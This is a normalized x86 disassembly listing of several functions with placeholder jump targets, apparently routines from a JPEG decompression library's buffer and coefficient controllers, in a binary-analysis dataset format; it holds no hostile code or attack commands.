mov [ eax + 0x48 ] edx
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov eax [ ecx + 0x4c ]
cmp eax [ edx + 0x11c ]
jne r-xdata
cmp [ ebp - 0x8 ] 0x1
je r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx + 0x30 ] 0x1
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x4c ]
add ecx 0x1
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4c ] ecx
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx + 0x44 ] 0x1
mov ecx [ ebp + 0x8 ]
push ecx
call sub_421630
add esp 0x4
mov eax [ ebp + 0x14 ]
push eax
mov ecx [ ebp + 0x10 ]
push ecx
mov edx [ ebp + 0xc ]
push edx
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x48 ]
push ecx
mov edx [ ebp - 0x4 ]
add edx 0x34
push edx
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x40 ]
mov edx [ ebp - 0x4 ]
mov eax [ edx + ecx * 4 + 0x38 ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x18c ]
call [ eax + 0x4 ]
add esp 0x1c
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ecx + 0x34 ]
cmp eax [ edx + 0x48 ]
jae r-xdata
cmp [ ebp - 0x8 ] 0x2
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x4 ]
cmp [ ecx + 0x4c ] 0x1
jne r-xdata
jmp r-xdata
mov edx [ ebp + 0x14 ]
push edx
mov eax [ ebp + 0x10 ]
push eax
mov ecx [ ebp + 0xc ]
push ecx
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x48 ]
push eax
mov ecx [ ebp - 0x4 ]
add ecx 0x34
push ecx
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x40 ]
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + eax * 4 + 0x38 ]
push edx
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x18c ]
call [ edx + 0x4 ]
add esp 0x1c
mov eax [ ebp - 0x4 ]
mov ecx [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
cmp edx [ ecx + 0x48 ]
jae r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x40 ]
xor ecx 0x1
mov edx [ ebp - 0x4 ]
mov [ edx + 0x40 ] ecx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x30 ] 0x0
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x118 ]
add edx 0x1
mov eax [ ebp - 0x4 ]
mov [ eax + 0x34 ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x118 ]
add edx 0x2
mov eax [ ebp - 0x4 ]
mov [ eax + 0x48 ] edx
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x44 ] 0x2
mov edx [ ebp + 0x8 ]
push edx
call sub_4214f0
add esp 0x4
mov eax [ ebp - 0x4 ]
mov [ eax + 0x44 ] 0x0
mov ecx [ ebp + 0x10 ]
mov edx [ ecx ]
cmp edx [ ebp + 0x14 ]
jb r-xdata
jmp r-xdata
jmp r-xdata
sub_4214f0
push ebp
mov ebp esp
sub esp 0x60
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x184 ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x118 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x8 ] 0x0
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0xc4 ]
mov [ ebp - 0x18 ] edx
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x8 ]
cmp eax [ edx + 0x24 ]
jge r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x18 ]
mov eax [ ecx + 0xc ]
imul eax [ edx + 0x24 ]
mov ecx [ ebp + 0x8 ]
cdq
idiv [ ecx + 0x118 ]
mov [ ebp - 0x10 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x38 ]
mov ecx [ ebp - 0x8 ]
mov edx [ eax + ecx * 4 ]
mov [ ebp - 0x1c ] edx
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x3c ]
mov edx [ ebp - 0x8 ]
mov eax [ ecx + edx * 4 ]
mov [ ebp - 0x20 ] eax
mov [ ebp - 0xc ] 0x0
jmp r-xdata
mov edx [ ebp - 0xc ]
cmp edx [ ebp - 0x10 ]
jge r-xdata
jmp r-xdata
mov eax [ ebp - 0x14 ]
add eax 0x1
mov ecx [ ebp - 0x10 ]
imul ecx eax
add ecx [ ebp - 0xc ]
mov edx [ ebp - 0xc ]
sub edx [ ebp - 0x10 ]
mov eax [ ebp - 0x1c ]
mov esi [ ebp - 0x1c ]
mov ecx [ esi + ecx * 4 ]
mov [ eax + edx * 4 ] ecx
mov edx [ ebp - 0x14 ]
add edx 0x1
mov eax [ ebp - 0x10 ]
imul eax edx
add eax [ ebp - 0xc ]
mov ecx [ ebp - 0xc ]
sub ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x20 ]
mov esi [ ebp - 0x20 ]
mov eax [ esi + eax * 4 ]
mov [ edx + ecx * 4 ] eax
mov ecx [ ebp - 0x14 ]
add ecx 0x2
mov edx [ ebp - 0x10 ]
imul edx ecx
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x1c ]
mov ecx [ ebp - 0xc ]
mov esi [ ebp - 0x1c ]
mov ecx [ esi + ecx * 4 ]
mov [ eax + edx * 4 ] ecx
mov edx [ ebp - 0x14 ]
add edx 0x2
mov eax [ ebp - 0x10 ]
imul eax edx
add eax [ ebp - 0xc ]
mov ecx [ ebp - 0x20 ]
mov edx [ ebp - 0xc ]
mov esi [ ebp - 0x20 ]
mov edx [ esi + edx * 4 ]
mov [ ecx + eax * 4 ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
add eax 0x1
mov [ ebp - 0x8 ] eax
mov ecx [ ebp - 0x18 ]
add ecx 0x54
mov [ ebp - 0x18 ] ecx
mov ecx [ ebp - 0xc ]
add ecx 0x1
mov [ ebp - 0xc ] ecx
sub_421630
push ebp
mov ebp esp
sub esp 0x60
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x184 ]
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] 0x0
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0xc4 ]
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x8 ]
cmp ecx [ eax + 0x24 ]
jge r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x1c ]
mov ecx [ edx + 0xc ]
imul ecx [ eax + 0x24 ]
mov [ ebp - 0x14 ] ecx
mov ecx [ ebp + 0x8 ]
mov eax [ ebp - 0x14 ]
cdq
idiv [ ecx + 0x118 ]
mov [ ebp - 0x10 ] eax
mov edx [ ebp - 0x1c ]
mov eax [ edx + 0x2c ]
xor edx edx
div [ ebp - 0x14 ]
mov [ ebp - 0x18 ] edx
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x18 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x40 ]
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + eax * 4 + 0x38 ]
mov eax [ ebp - 0x8 ]
mov ecx [ edx + eax * 4 ]
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0xc ] 0x0
jmp r-xdata
mov eax [ ebp - 0x18 ]
sub eax 0x1
cdq
idiv [ ebp - 0x10 ]
add eax 0x1
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x48 ] eax
mov eax [ ebp - 0x10 ]
shl eax 0x1
cmp [ ebp - 0xc ] eax
jge r-xdata
jmp r-xdata
mov ecx [ ebp - 0x18 ]
add ecx [ ebp - 0xc ]
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0x18 ]
mov esi [ ebp - 0x20 ]
mov eax [ esi + eax * 4 - 0x4 ]
mov [ edx + ecx * 4 ] eax
jmp r-xdata
mov ecx [ ebp - 0x8 ]
add ecx 0x1
mov [ ebp - 0x8 ] ecx
mov edx [ ebp - 0x1c ]
add edx 0x54
mov [ ebp - 0x1c ] edx
mov edx [ ebp - 0xc ]
add edx 0x1
mov [ ebp - 0xc ] edx
sub_421730
push ebp
mov ebp esp
sub esp 0x40
push ebx
push esi
push edi
mov eax [ ebp + 0x14 ]
push eax
mov ecx [ ebp + 0x10 ]
push ecx
mov edx [ ebp + 0xc ]
push edx
push 0x0
push 0x0
push 0x0
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x18c ]
call [ edx + 0x4 ]
add esp 0x1c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_421770
push ebp
mov ebp esp
sub esp 0x58
push ebx
push esi
push edi
push 0x74
push 0x1
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x4 ]
call [ edx ]
add esp 0xc
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x188 ] ecx
mov edx [ ebp - 0x4 ]
mov [ edx ] sub_421910
mov eax [ ebp - 0x4 ]
mov [ eax + 0x8 ] sub_4219d0
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x70 ] 0x0
mov edx [ ebp + 0xc ]
and edx 0xff
test edx edx
je r-xdata
push 0x500
push 0x1
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x4 ]
call [ edx + 0x4 ]
add esp 0xc
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x18 ] 0x0
jmp r-xdata
mov [ ebp - 0x8 ] 0x0
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0xc4 ]
mov [ ebp - 0x10 ] ecx
jmp r-xdata
cmp [ ebp - 0x18 ] 0xa
jge r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x8 ]
cmp edx [ ecx + 0x24 ]
jge r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] sub_421d00
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] sub_421a40
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x10 ] 0x0
mov ecx [ ebp - 0x18 ]
shl ecx 0x7
mov edx [ ebp - 0x14 ]
add edx ecx
mov eax [ ebp - 0x18 ]
mov ecx [ ebp - 0x4 ]
mov [ ecx + eax * 4 + 0x20 ] edx
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] sub_421d20
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] sub_421f60
mov ecx [ ebp - 0x4 ]
add ecx 0x48
mov edx [ ebp - 0x4 ]
mov [ edx + 0x10 ] ecx
jmp r-xdata
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0xc ]
mov [ ebp - 0xc ] ecx
mov edx [ ebp + 0x8 ]
xor eax eax
mov al [ edx + 0xc8 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x18 ]
add eax 0x1
mov [ ebp - 0x18 ] eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0xc ]
push edx
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0xc ]
push ecx
mov edx [ ebp - 0x10 ]
mov eax [ edx + 0x20 ]
push eax
call sub_420c90
add esp 0x8
push eax
mov ecx [ ebp - 0x10 ]
mov edx [ ecx + 0x8 ]
push edx
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0x1c ]
push ecx
call sub_420c90
add esp 0x8
push eax
push 0x1
push 0x1
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x4 ]
call [ ecx + 0x14 ]
add esp 0x18
mov edx [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
mov [ ecx + edx * 4 + 0x48 ] eax
jmp r-xdata
mov ecx [ ebp - 0xc ]
imul ecx ecx 0x3
mov [ ebp - 0xc ] ecx
mov edx [ ebp - 0x8 ]
add edx 0x1
mov [ ebp - 0x8 ] edx
mov eax [ ebp - 0x10 ]
add eax 0x54
mov [ ebp - 0x10 ] eax
sub_421910
push ebp
mov ebp esp
sub esp 0x40
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov [ eax + 0x80 ] 0x0
mov ecx [ ebp + 0x8 ]
push ecx
call sub_421940
add esp 0x4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_421940
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x188 ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x124 ] 0x1
jle r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x11c ]
sub edx 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x80 ] edx
jae r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1c ] 0x1
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x128 ]
mov ecx [ ebp - 0x4 ]
mov edx [ eax + 0x48 ]
mov [ ecx + 0x1c ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x128 ]
mov eax [ ebp - 0x4 ]
mov ecx [ edx + 0xc ]
mov [ eax + 0x1c ] ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] 0x0
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x18 ] 0x0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4219d0
push ebp
mov ebp esp
sub esp 0x44
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x188 ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x4 ]
cmp [ edx + 0x10 ] 0x0
je r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx + 0x88 ] 0x0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov cl [ eax + 0x49 ]
test ecx ecx
je r-xdata
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0xc ] sub_421f60
mov edx [ ebp + 0x8 ]
push edx
call sub_422180
add esp 0x4
and eax 0xff
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] sub_422300
jmp r-xdata
sub_421a40
push ebp
mov ebp esp
sub esp 0x80
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x188 ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x138 ]
sub eax 0x1
mov [ ebp - 0xc ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x11c ]
sub edx 0x1
mov [ ebp - 0x10 ] edx
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x18 ]
mov [ ebp - 0x24 ] ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ ebp - 0x24 ]
cmp ecx [ eax + 0x1c ]
jge r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x88 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x88 ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x80 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x80 ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
mov eax [ ecx + 0x80 ]
cmp eax [ edx + 0x11c ]
jae r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x14 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x190 ]
call [ ecx + 0xc ]
add esp 0x4
mov eax 0x4
mov ecx [ ebp + 0x8 ]
push ecx
call sub_421940
add esp 0x4
mov eax 0x3
jmp r-xdata
mov edx [ ebp - 0x8 ]
cmp edx [ ebp - 0xc ]
ja r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] 0x0
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x140 ]
shl ecx 0x7
push ecx
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x20 ]
push eax
call sub_420d70
add esp 0x8
mov ecx [ ebp - 0x4 ]
add ecx 0x20
push ecx
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x198 ]
call [ ecx + 0x4 ]
add esp 0x8
and eax 0xff
test eax eax
jne r-xdata
mov edx [ ebp - 0x24 ]
add edx 0x1
mov [ ebp - 0x24 ] edx
mov [ ebp - 0x14 ] 0x0
mov [ ebp - 0x18 ] 0x0
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x24 ]
mov [ edx + 0x18 ] eax
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ ecx + 0x14 ] edx
xor eax eax
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x18 ]
cmp edx [ ecx + 0x124 ]
jge r-xdata
jmp r-xdata
mov eax [ ebp - 0x18 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + eax * 4 + 0x128 ]
mov [ ebp - 0x38 ] edx
mov eax [ ebp - 0x38 ]
xor ecx ecx
mov cl [ eax + 0x30 ]
test ecx ecx
jne r-xdata
mov ecx [ ebp - 0x8 ]
add ecx 0x1
mov [ ebp - 0x8 ] ecx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x19c ]
mov eax [ ebp - 0x38 ]
mov ecx [ eax + 0x4 ]
mov edx [ edx + ecx * 4 + 0x4 ]
mov [ ebp - 0x3c ] edx
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0xc ]
jae r-xdata
mov edx [ ebp - 0x38 ]
mov eax [ ebp - 0x14 ]
add eax [ edx + 0x3c ]
mov [ ebp - 0x14 ] eax
jmp r-xdata
mov eax [ ebp - 0x38 ]
mov ecx [ eax + 0x44 ]
mov [ ebp - 0x40 ] ecx
mov ecx [ ebp - 0x38 ]
mov edx [ ecx + 0x34 ]
mov [ ebp - 0x40 ] edx
jmp r-xdata
mov eax [ ebp - 0x18 ]
add eax 0x1
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x38 ]
mov ecx [ ebp - 0x20 ]
cmp ecx [ eax + 0x38 ]
jge r-xdata
mov edx [ ebp - 0x40 ]
mov [ ebp - 0x28 ] edx
mov eax [ ebp - 0x38 ]
mov ecx [ eax + 0x4 ]
mov edx [ ebp - 0x38 ]
mov eax [ ebp - 0x24 ]
imul eax [ edx + 0x24 ]
mov edx [ ebp + 0xc ]
mov ecx [ edx + ecx * 4 ]
lea edx [ ecx + eax * 4 ]
mov [ ebp - 0x2c ] edx
mov eax [ ebp - 0x38 ]
mov ecx [ ebp - 0x8 ]
imul ecx [ eax + 0x40 ]
mov [ ebp - 0x30 ] ecx
mov [ ebp - 0x20 ] 0x0
jmp r-xdata
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x80 ]
cmp eax [ ebp - 0x10 ]
jb r-xdata
mov eax [ ebp - 0x30 ]
mov [ ebp - 0x34 ] eax
mov [ ebp - 0x1c ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x24 ]
add ecx [ ebp - 0x20 ]
mov edx [ ebp - 0x38 ]
cmp ecx [ edx + 0x48 ]
jge r-xdata
mov edx [ ebp - 0x1c ]
cmp edx [ ebp - 0x28 ]
jge r-xdata
mov eax [ ebp - 0x38 ]
mov ecx [ ebp - 0x14 ]
add ecx [ eax + 0x34 ]
mov [ ebp - 0x14 ] ecx
mov edx [ ebp - 0x38 ]
mov eax [ edx + 0x24 ]
mov ecx [ ebp - 0x2c ]
lea edx [ ecx + eax * 4 ]
mov [ ebp - 0x2c ] edx
jmp r-xdata
mov eax [ ebp - 0x34 ]
push eax
mov ecx [ ebp - 0x2c ]
push ecx
mov edx [ ebp - 0x14 ]
add edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax + edx * 4 + 0x20 ]
push ecx
mov edx [ ebp - 0x38 ]
push edx
mov eax [ ebp + 0x8 ]
push eax
call [ ebp - 0x3c ]
add esp 0x14
mov ecx [ ebp - 0x38 ]
mov edx [ ebp - 0x34 ]
add edx [ ecx + 0x24 ]
mov [ ebp - 0x34 ] edx
jmp r-xdata
mov edx [ ebp - 0x20 ]
add edx 0x1
mov [ ebp - 0x20 ] edx
mov ecx [ ebp - 0x1c ]
add ecx 0x1
mov [ ebp - 0x1c ] ecx
sub_421d00
push ebp
mov ebp esp
sub esp 0x40
push ebx
push esi
push edi
xor eax eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_421d20
push ebp
mov ebp esp
sub esp 0x78
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x188 ]
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x10 ] 0x0
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x10 ]
cmp ecx [ eax + 0x124 ]
jge r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x18 ]
mov [ ebp - 0x1c ] ecx
jmp r-xdata
mov edx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + edx * 4 + 0x128 ]
mov [ ebp - 0x38 ] ecx
push 0x1
mov edx [ ebp - 0x38 ]
mov eax [ edx + 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x38 ]
mov eax [ ecx + 0x80 ]
imul eax [ edx + 0xc ]
push eax
mov ecx [ ebp - 0x38 ]
mov edx [ ecx + 0x4 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax + edx * 4 + 0x48 ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x4 ]
call [ ecx + 0x20 ]
add esp 0x14
mov edx [ ebp - 0x10 ]
mov [ ebp + edx * 4 - 0x30 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ ebp - 0x1c ]
cmp ecx [ eax + 0x1c ]
jge r-xdata
mov edx [ ebp - 0x10 ]
add edx 0x1
mov [ ebp - 0x10 ] edx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x80 ]
add eax 0x1
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x80 ] eax
mov edx [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov ecx [ edx + 0x80 ]
cmp ecx [ eax + 0x11c ]
jae r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x14 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x190 ]
call [ edx + 0xc ]
add esp 0x4
mov eax 0x4
mov edx [ ebp + 0x8 ]
push edx
call sub_421940
add esp 0x4
mov eax 0x3
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x8 ]
cmp eax [ edx + 0x138 ]
jae r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x14 ] 0x0
jmp r-xdata
mov [ ebp - 0xc ] 0x0
mov [ ebp - 0x10 ] 0x0
jmp r-xdata
mov edx [ ebp - 0x1c ]
add edx 0x1
mov [ ebp - 0x1c ] edx
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x10 ]
cmp eax [ edx + 0x124 ]
jge r-xdata
mov edx [ ebp - 0x4 ]
add edx 0x20
push edx
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x198 ]
call [ edx + 0x4 ]
add esp 0x8
and eax 0xff
test eax eax
jne r-xdata
mov ecx [ ebp - 0x10 ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + ecx * 4 + 0x128 ]
mov [ ebp - 0x38 ] eax
mov ecx [ ebp - 0x38 ]
mov edx [ ebp - 0x8 ]
imul edx [ ecx + 0x34 ]
mov [ ebp - 0x20 ] edx
mov [ ebp - 0x18 ] 0x0
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ ebp - 0x1c ]
mov [ eax + 0x18 ] ecx
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov [ edx + 0x14 ] eax
xor eax eax
jmp r-xdata
mov ecx [ ebp - 0x38 ]
mov edx [ ebp - 0x18 ]
cmp edx [ ecx + 0x38 ]
jge r-xdata
mov ecx [ ebp - 0x8 ]
add ecx 0x1
mov [ ebp - 0x8 ] ecx
jmp r-xdata
mov eax [ ebp - 0x18 ]
add eax [ ebp - 0x1c ]
mov ecx [ ebp - 0x10 ]
mov edx [ ebp + ecx * 4 - 0x30 ]
mov ecx [ ebp - 0x20 ]
shl ecx 0x7
mov edx [ edx + eax * 4 ]
add edx ecx
mov [ ebp - 0x34 ] edx
mov [ ebp - 0x14 ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x10 ]
add ecx 0x1
mov [ ebp - 0x10 ] ecx
mov ecx [ ebp - 0x38 ]
mov edx [ ebp - 0x14 ]
cmp edx [ ecx + 0x34 ]
jge r-xdata
jmp r-xdata
mov eax [ ebp - 0xc ]
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x34 ]
mov [ ecx + eax * 4 + 0x20 ] edx
mov eax [ ebp - 0xc ]
add eax 0x1
mov [ ebp - 0xc ] eax
mov ecx [ ebp - 0x34 ]
add ecx 0x80
mov [ ebp - 0x34 ] ecx
jmp r-xdata
mov eax [ ebp - 0x18 ]
add eax 0x1
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x14 ]
add eax 0x1
mov [ ebp - 0x14 ] eax
sub_421f60
push ebp
mov ebp esp
sub esp 0x70
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x188 ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x11c ]
sub eax 0x1
mov [ ebp - 0x8 ] eax
mov ecx [ ebp + 0x8 ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x190 ]
call [ eax ]
add esp 0x4
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
mov eax [ ecx + 0x7c ]
cmp eax [ edx + 0x84 ]
jne r-xdata
jmp r-xdata
xor eax eax
jmp r-xdata
mov [ ebp - 0x10 ] 0x0
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0xc4 ]
mov [ ebp - 0x2c ] edx
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
mov eax [ ecx + 0x80 ]
cmp eax [ edx + 0x88 ]
ja r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
mov eax [ ecx + 0x7c ]
cmp eax [ edx + 0x84 ]
jl r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x10 ]
cmp eax [ edx + 0x24 ]
jge r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x88 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x88 ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
mov eax [ ecx + 0x88 ]
cmp eax [ edx + 0x11c ]
jae r-xdata
mov ecx [ ebp - 0x2c ]
xor edx edx
mov dl [ ecx + 0x30 ]
test edx edx
jne r-xdata
mov eax 0x4
mov eax 0x3
jmp r-xdata
push 0x0
mov eax [ ebp - 0x2c ]
mov ecx [ eax + 0xc ]
push ecx
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x2c ]
mov ecx [ edx + 0x88 ]
imul ecx [ eax + 0xc ]
push ecx
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax + edx * 4 + 0x48 ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x4 ]
call [ ecx + 0x20 ]
add esp 0x14
mov [ ebp - 0x1c ] eax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x88 ]
cmp eax [ ebp - 0x8 ]
jae r-xdata
jmp r-xdata
mov eax [ ebp - 0x2c ]
mov ecx [ ebp - 0x2c ]
mov eax [ eax + 0x20 ]
xor edx edx
div [ ecx + 0xc ]
mov [ ebp - 0x18 ] edx
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x2c ]
mov edx [ ecx + 0xc ]
mov [ ebp - 0x18 ] edx
jmp r-xdata
mov eax [ ebp - 0x10 ]
add eax 0x1
mov [ ebp - 0x10 ] eax
